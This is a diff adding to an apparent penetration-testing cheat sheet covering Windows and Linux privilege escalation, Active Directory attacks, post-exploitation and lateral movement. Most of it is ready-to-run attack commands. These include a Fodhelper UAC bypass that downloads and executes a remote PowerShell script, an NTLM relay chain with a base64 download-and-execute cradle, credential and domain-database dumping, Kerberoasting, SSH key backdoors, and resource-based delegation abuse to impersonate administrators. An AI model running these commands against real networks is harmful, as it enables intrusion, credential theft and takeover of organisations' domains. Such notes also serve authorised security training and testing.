@@ -162,6 +162,16 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=t
 ## PrivEsc(Windows)
 
 - First off, do local and then domain enumeration as much as you can.
+- Domain enumeration is best executed via SharpHound.exe within the windows host but if not possible or you cant gain access to a Windows host that is from another domain, you can run bloodhound-ce-python
+- When using kerberos authentication, you need to update your /etc/hosts. The best way to do this properly is this
+```bash
+nxc smb 172.16.XX.XX/24 -u '' -p '' --generate-hosts-file hostfile
+# copy and paste the output in hostfile in /etc/hosts
+```
+```bash
+# via kerberos
+bloodhound-ce-python -c all -d target.com -ns 172.16.221.101 -u lisa.penn@target.com -k -no-pass
+```
 - If applocker is in effect, you can use the Interactive Runspace () and run Invoke-Bloodhound and Winpeas.ps1 via InstalUtil
 - You can also try the metasploit module post/windows/manage/execute_assembly
 
@@ -209,15 +219,57 @@ nxc ldap <DC of domain> -u <User> -H 'hash' --module laps
 #### IT/DEV/HR/(somethingADMINS)
 
 
+#### Bypassing UAC
+- You see that your user is part of the local Administrators group but yet when you whoami /priv, you dont see perms like SeImpersonatePrivilege. Why?
+- That is because you are operating in Medium or lower context due to UAC being active
+- UAC bypass via Fodhelper by creating yet another shell as the same guy but a higher level
+```bash
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/simplerunner64.txt') | IEX" -Force
 
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 
+C:\Windows\System32\fodhelper.exe
+```
 
 ## PrivEsc (Linux)
 
+### The Usual
+- check for sudo -l, history, SUID bits, cron jobs, overly permissive bash files etc
+- check users via /etc/passwd and /home and see if you can see any passwords you have found earlier
+- sometimes passwords are just the usernames
+- check for config files on web services (apache2 config.php)
+- run linpeas or lse or pspy
 
+### Ansible Stuff
+- Check if there is ansible on the host iether by running ansible or checking if /opt/ansible exists
+- even if there isn't, you want to see if there are 
+- if you run into an Ansible Vault file or things iwth Ansible Vault text, try cracking. Password from the vault is probably for root or something
+```bash
+# copy the text starting from $ANSIBLE_VAULT, strip all whitespaces and new lines
+ansible2john vault.txt > ansible.txt
+# remove prepended stuff by john
+hashcat -m 16900 ansible.txt rockyou.txt
+# transfer vault.txt back to the victim and decrypt. Provide the cracked password
+cat vault.txt | ansible-vault decrypt
+```
+### Kerberos Cache files
+- check /tmp folder and see if there are any kerberos cache and see who owns those
+- the /tmp folder differs for each user! so if you can switch, be sure to check!
+```bash
+ls -la /tmp 
+# search filesystem
+find / -name krb5cc_* 2>/dev/null
+# copy the file first because the name of cache file can change dynamically
+cp /tmp/krb5cc_iabasbobasd /tmp/krb5cc_owned
+# copy this out to your kali to be imported to your env
+export KRB5CCNAME=<path to your krb5cc_owned>
 
+```
 
-## Post-Exploitation
+### ControlMaster SSH Session Hijacking
+
+## Post-Exploitation (Windows)
+- Remember to tag the owned host on Bloodhound!
 
 ### Disable Defenses
 - Once you get someone with admin permissions, disable Defender, UAC, and firewall. You may also wish to open up WinRM and RDP ports for convenience
@@ -233,6 +285,9 @@ netsh firewall add portopening TCP 3389 "Remote Desktop"
 winrm quickconfig
 ```
 
+### Check config files
+- if there is inetpub, it is worth investigating the Web.Config file to see any connection references to things like MSSQL or DB. Usually that will be a hint towards the next step
+
 ### Mimikatz
 ```cmd
 privilege::debug
@@ -245,8 +300,34 @@ lsadump::secrets
 # if user is DA or has backup powers
 lsadump::dcsync /domain:<domain> /all /csv
 ```
+Alternative
+```bash
+nxc smb <target ip> -u Administrator -p <password> --sam --lsa -M lsassy
+# to dump everything out from DC
+nxc smb <DC ip> -u Administrator -p <password> -M ntdsutil
+```
+
+## Post Exploitation (Linux)
+
+- if there are domain users inside the /home folder, check their folders for .ssh keys and cache files or any other non-default stuff
+- check the known_hosts files in the .ssh folder to check if there are info on ssh histories
+- Generate SSH keys for these users so that you can login as them since you are root
+```bash
+# on kali
+ssh-keygen -t rsa
+# copy the id_rsa.pub file to the victim's .ssh folder and rename it authorized_keys
+chmod 700 .ssh
+chmod 600 authorized_keys
+chown victim:victim authorized_keys
+# you can now ssh in with the id_rsa key without password
+```
 
 ## Lateral Movement
+
+### Psexec with Admin
+```bash
+psexec.py <domain>/<user>@<FQDN host> -k -no-pass
+```
 
 ### Via MSSQL
 - Note any hosts named DB or SQL
@@ -294,3 +375,83 @@ exec_as_user sa
 use_link DB03
 # then do the following until you hit somewhere where you can xp_cmdshell for profit
 ```
+
+#### NTLMRelay 
+- if NTLMv2 hash from responder not crackable, and you cant execute xp_cmdshell on the remote DB BUT you can run xp_dirtree, try an NTLM Relay attack
+```bash
+# if you have smbd active, disable it first
+sudo ss --tcp --udp --listen --numeric --process | grep 445
+kill <pid>
+
+# Set up ntlmrelayx; check for command execution
+sudo ntlmrelayx.py --no-http-server -smb2support -t <target ip> -c 'whoami'
+# on the mssqlclient, run xp_dirtree
+xp_dirtree \\<attacker ip>\any\file.txt
+# once command execution is confirm, do a powershell shellcode runner. Base64 it to avoid problems
+# on kali
+$a = "(New-Object System.Net.WebClient).DownloadString('http://<attackerip>/shellcoderunner.ps1') | IEX"
+$b = [System.Text.Encoding]::Unicode.GetBytes($a)
+$e = [Convert]::ToBase64String($b)
+```
+
+### Kerberoasting
+- once you have a domain user, do this and see if there are easy wins
+- also you can try request cross-domain SPNs if you believe your domain account can do so!
+- if not crackable, it might be possible to do a silver ticket attack
+```bash
+# via kerberos ticket
+GetUserSPNs.py -request -target-domain test.com -dc-ip 172.16.221.101 -outputfile kerber.hash test.com/lisa.penn -k -no-pass
+
+hashcat -m 13100 kerber.hash rockyou.txt
+```
+
+### Via Password Spray/Reuse
+- When compromising any windows host, try spraying the local administrator as well as new domain users you obtained
+- maybe that DEV01 admin hash can work for DEV02 or that mssql admin hash for SQL11 works for SQL13?
+```bash
+nxc smb/mssql/winrm/rdp 172.16.XX.XX -u administrator -H 'hash' --local-auth
+nxc ssh 172.16.XX.XX -u tom.jerry@test.local -p 'password'
+# remember to reload your tickets!
+klist
+nxc smb 172.16.XX.XX -u tom.jerry -k --use-kcache
+```
+
+### ACL Based Attacks
+
+#### WriteDACL
+```bash
+# sqlsvc is the controlled user with WriteDACL rights, -target-dn is the target group you want to write stuff to
+sudo /home/kali/.local/bin/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'sqlsvc' -target-dn 'CN=MAILADMINS,OU=TGROUPS,DC=LOCAL,DC=COM' 'local.com'/'sqlsvc':'password' -dc-ip <dc-ip>
+
+# this adds sqlsvc to become a member of mailadmins
+net rpc group addmem "mailadmins" "sqlsvc" -U "tricky.com"/"sqlsvc"%"password" -S <dc-ip>
+
+```
+
+#### GenericWrite/Resource-Based Constrained Delegation
+```bash
+# computer name can be anything; need to provide a legitimate domain user that has admin powers on the HOST that can GenericWrite to another host
+addcomputer.py -computer-name 'attacker01' -computer-pass 'Password123!' -dc-host local.com -dc-ip 172.16.195.165 local.com/jim -hashes ':NT hash'
+# we then set up the delegation from attacker01 to the victim host
+rbcd.py -delegate-from 'attacker01$' -delegate-to 'victim09$' -action 'write' local.com/victim09$ -dc-ip 172.16.195.165 -hashes ':hash'
+# get the ST for the service name that we are pretending to be admin for
+getST.py -spn 'cifs/victim09.local.com' -impersonate 'administrator' 'local.com/attacker01:Password123!' -dc-ip 172.16.195.165
+# export ticket
+export KRB5CCNAME=<ticket>
+psexec.py administrator@victim09.local.com -k -no-pass
+```
+
+#### DelegateTo
+```bash
+## do try http, mssql for altservice if it doesnt work! For the SPN, check the spn value of the victim in the bloodhound
+getST.py -spn 'MSSQLSVC/target.test-ops.com' -impersonate 'administrator' -altservice 'cifs' -hashes ':<hash of controlled machine account>' 'TEST-OPS.COM/CONTROLLEDMACHINE$' -dc-ip 172.16.211.100
+```
+
+#### child/Parent Domain Trust
+- if the child is TrustedBy the parent domain, we can use a raiseby to elevate ourselves from domain admin to enterprise admin
+```bash
+raiseChild.py ops.local.com/testAdmin -hashes ':NT hash'
+```
+
+## Cross-Domain Movement
+- check for foreign members. From bloodhound, click on the domain object and check the members and see what rights they have on the other domain
